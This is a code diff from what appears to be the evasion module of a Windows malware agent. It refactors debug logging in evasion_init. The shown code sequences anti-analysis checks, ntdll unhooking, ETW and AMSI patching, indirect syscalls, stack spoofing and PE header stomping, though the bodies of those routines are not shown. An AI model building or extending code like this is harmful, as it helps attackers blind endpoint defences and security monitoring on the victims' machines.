@@ -512,42 +512,37 @@ static void _probe_threads(const char *after_step) {
 #define PROBE(step) ((void)0)
 #endif
 
-BOOL evasion_init(void) {
+/*
+ * Win32-only early log helper — no CRT dependency.
+ * -Wl,-e,main skips CRT init so fopen/fprintf don't work.
+ */
 #if CONFIG_DEBUG
-    {
-        FILE *_ef = fopen("C:\\Windows\\Temp\\agent_early.log", "a");
-        if (_ef) {
-            fprintf(_ef, "[evasion] evasion_init() enter\r\n");
-            fflush(_ef); fclose(_ef);
-        }
+static void _elog(const char *msg, DWORD len) {
+    HANDLE h = CreateFileA("C:\\Windows\\Temp\\agent_early.log",
+        FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE,
+        NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (h != INVALID_HANDLE_VALUE) {
+        DWORD w;
+        WriteFile(h, msg, len, &w, NULL);
+        CloseHandle(h);
     }
+}
+#define ELOG(s) _elog(s, sizeof(s) - 1)
+#else
+#define ELOG(s) ((void)0)
 #endif
+
+BOOL evasion_init(void) {
+    ELOG("[evasion] enter\r\n");
 
     /* Load-time: anti-analysis (exits agent if detected) */
     if (!anti_analysis_check()) {
-#if CONFIG_DEBUG
-        {
-            FILE *_ef = fopen("C:\\Windows\\Temp\\agent_early.log", "a");
-            if (_ef) {
-                fprintf(_ef, "[evasion] anti_analysis_check() FAILED — exiting\r\n");
-                fflush(_ef); fclose(_ef);
-            }
-        }
-#endif
+        ELOG("[evasion] anti_analysis FAILED\r\n");
         return FALSE;
     }
 
     PROBE("anti_analysis");
-
-#if CONFIG_DEBUG
-    {
-        FILE *_ef = fopen("C:\\Windows\\Temp\\agent_early.log", "a");
-        if (_ef) {
-            fprintf(_ef, "[evasion] anti_analysis OK\r\n");
-            fflush(_ef); fclose(_ef);
-        }
-    }
-#endif
+    ELOG("[evasion] anti_analysis OK\r\n");
 
     /* Run-time patches — order matters:
      * 1. Unhook ntdll FIRST (restores clean syscalls for everything else)
@@ -560,34 +555,19 @@ BOOL evasion_init(void) {
 #if CONFIG_UNHOOK_NTDLL
     evasion_unhook_ntdll();
     PROBE("unhook_ntdll");
-#if CONFIG_DEBUG
-    {
-        FILE *_ef = fopen("C:\\Windows\\Temp\\agent_early.log", "a");
-        if (_ef) { fprintf(_ef, "[evasion] unhook_ntdll done\r\n"); fflush(_ef); fclose(_ef); }
-    }
-#endif
+    ELOG("[evasion] unhook done\r\n");
 #endif
 
 #if CONFIG_PATCH_ETW
     evasion_patch_etw();
     PROBE("patch_etw");
-#if CONFIG_DEBUG
-    {
-        FILE *_ef = fopen("C:\\Windows\\Temp\\agent_early.log", "a");
-        if (_ef) { fprintf(_ef, "[evasion] patch_etw done\r\n"); fflush(_ef); fclose(_ef); }
-    }
-#endif
+    ELOG("[evasion] etw done\r\n");
 #endif
 
 #if CONFIG_PATCH_AMSI
     evasion_patch_amsi();
     PROBE("patch_amsi");
-#if CONFIG_DEBUG
-    {
-        FILE *_ef = fopen("C:\\Windows\\Temp\\agent_early.log", "a");
-        if (_ef) { fprintf(_ef, "[evasion] patch_amsi done\r\n"); fflush(_ef); fclose(_ef); }
-    }
-#endif
+    ELOG("[evasion] amsi done\r\n");
 #endif
 
 #if CONFIG_INDIRECT_SYSCALLS
@@ -596,42 +576,23 @@ BOOL evasion_init(void) {
     }
     sw_init();
     PROBE("indirect_syscalls");
-#if CONFIG_DEBUG
-    {
-        FILE *_ef = fopen("C:\\Windows\\Temp\\agent_early.log", "a");
-        if (_ef) { fprintf(_ef, "[evasion] indirect_syscalls done\r\n"); fflush(_ef); fclose(_ef); }
-    }
-#endif
+    ELOG("[evasion] syscalls done\r\n");
 #endif
 
 #if CONFIG_STACK_SPOOF
     spoof_init();
     PROBE("stack_spoof");
-#if CONFIG_DEBUG
-    {
-        FILE *_ef = fopen("C:\\Windows\\Temp\\agent_early.log", "a");
-        if (_ef) { fprintf(_ef, "[evasion] stack_spoof done\r\n"); fflush(_ef); fclose(_ef); }
-    }
-#endif
+    ELOG("[evasion] spoof done\r\n");
 #endif
 
     /* PE stomp must be LAST — after all code that reads PE headers */
 #if CONFIG_PE_STOMP
     evasion_stomp_pe_headers();
     PROBE("pe_stomp");
-#if CONFIG_DEBUG
-    {
-        FILE *_ef = fopen("C:\\Windows\\Temp\\agent_early.log", "a");
-        if (_ef) { fprintf(_ef, "[evasion] pe_stomp done\r\n"); fflush(_ef); fclose(_ef); }
-    }
-#endif
+    ELOG("[evasion] stomp done\r\n");
 #endif
 
-#if CONFIG_DEBUG
-    {
-        FILE *_ef = fopen("C:\\Windows\\Temp\\agent_early.log", "a");
-        if (_ef) { fprintf(_ef, "[evasion] evasion_init() complete OK\r\n"); fflush(_ef); fclose(_ef); }
-    }
+    ELOG("[evasion] complete OK\r\n");
 #endif
 
     return TRUE;
